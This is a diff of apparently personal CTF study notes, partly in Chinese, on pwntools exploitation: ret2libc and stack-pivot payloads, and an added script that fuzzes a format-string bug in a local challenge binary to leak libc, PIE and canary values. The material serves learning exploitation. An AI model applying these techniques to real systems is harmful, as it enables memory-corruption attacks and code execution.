@@ -16,7 +16,6 @@ p.interactive()
 lambda shortcut
 ```python
 # -*- coding: utf-8 -*-
-# -*- coding: utf-8 -*-
 from pwn import*
 context.log_level='debug'
 context.arch='amd64'
@@ -57,7 +56,7 @@ sl = lambda s : r.sendline(s)
 sd = lambda s : r.send(s)
 rc = lambda n : r.recv(n)
 rl = lambda: r.recvline()
-ru = lambda s : r.recvuntil(s)
+ru = lambda s : r.recvuntil(s, drop=True)
 ti = lambda: r.interactive()
 lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
 bhex = lambda b: int(b.decode(), 16)
@@ -97,6 +96,7 @@ attack payload
 就是 offset + canary + 随便 8 个 + pop_rdi + bin_sh + ret + system 也可以 
 还有
 我看到没有ret 也可以 ？？？？就以防万一 alignment 问题
+不一定是8 个!!!!!!!
 ```python
 libc.address=libc_base
 # dbg()
@@ -132,6 +132,35 @@ payload += b'/bin/sh\x00'              # 真正写入 "/bin/sh" 字符串
 payload = payload.ljust(offset, b'\x00')  # 填满 overflow 前的部分
 payload += p32(leak_bss)               # 栈迁移：将 esp 指向你构造的 payload（伪造栈帧）区域
 payload += p32(leave_ret)              # 执行栈迁移：leave = mov esp, ebp; pop ebp;  ret
+```
+
+brute canary 
+```python
+from pwn import*
+context.log_level='debug'
+# context.arch='amd64'
+context.os = "linux"
+
+fname = "./super_jumpio_kart_patched"
+
+
+def fuzz():
+  for i in range (100):
+    context.log_level = 'critical'
+    
+    r = process(fname)
+    r.sendlineafter('> ', '4')
+    r.sendlineafter(': ', f'%{i}$p')
+    r.recvuntil('with: ')
+    leak = r.recvline().strip().decode()
+    if leak.startswith('0x7'):
+      print(f'[{i}] Possible LIBC  : {leak}')
+    elif leak.startswith('0x5'):
+      print(f'[{i}] Possible PIE   : {leak}')
+    elif leak.endswith('00'):
+      print(f'[{i}] Possible Canary: {leak}')
+    r.close()
+fuzz()
 ```
 
 one gadget 
